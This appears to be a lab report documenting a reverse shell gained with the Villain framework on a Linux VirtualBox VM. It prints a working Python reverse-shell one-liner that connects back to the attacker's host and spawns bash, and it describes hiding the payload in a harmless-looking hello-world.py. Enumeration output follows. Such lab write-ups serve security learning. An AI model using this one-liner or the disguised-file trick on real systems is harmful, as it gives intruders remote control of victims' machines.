# Villain Framework Reverse Shell Report

## ⚙️ Setup Info
- **Payload:** `linux/reverse_tcp/python3 lhost=192.168.40.129`
- **LHOST:** 192.168.40.129
- **LPORT:** 4443
- **Target OS:** Linux (kayley-VirtualBox)
- **Target User:** kayley
- **Active Shell Session:** 884c08-112df5-13eb77

## 🔁 Payload Delivery Method
Reverse shell executed directly on the target VM using:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.40.129",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```
- Additionally, the payload was embedded in a seemingly harmless file (hello-world.py) and sent to the target via scp as well as over the internet.

- Villain framework recognized the session as 884c08-112df5-13eb77.

- Session established at 2025-08-14 17:33:14.

## 🖥️ Captured Info

- Hostname: Kayley-VirtualBox
- IP Address: 192.168.50.14
- Logged-in User: kayley
- OS Type: Linux

## 🔎 Enumeration and Proof of Access

- uname -a  //Discovering system information
    - Linux Kayley-VirtualBox 6.11.0-24-generic #24-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 14 14:35:34 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

- cat /etc/os-release //os details

```
    PRETTY_NAME="Ubuntu 24.10"
    NAME="Ubuntu"
    VERSION_ID="24.10"
    VERSION="24.10 (Oracular Oriole)"
    VERSION_CODENAME=oracular
    ID=ubuntu
    ID_LIKE=debian
    HOME_URL="https://www.ubuntu.com/"
    SUPPORT_URL="https://help.ubuntu.com/"
    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
    UBUNTU_CODENAME=oracular
    LOGO=ubuntu-logo
```
- whoami
    - kayley

## Screenshots
![Screenshot-1](<screenshots/ss-0.png>)

![Screenshot-2](<screenshots/ss-1.png>)

![Screenshot-3](<screenshots/ss-2.png>)

Displaying message in target VM
![Screenshot-4](<screenshots/ss-4.png>)
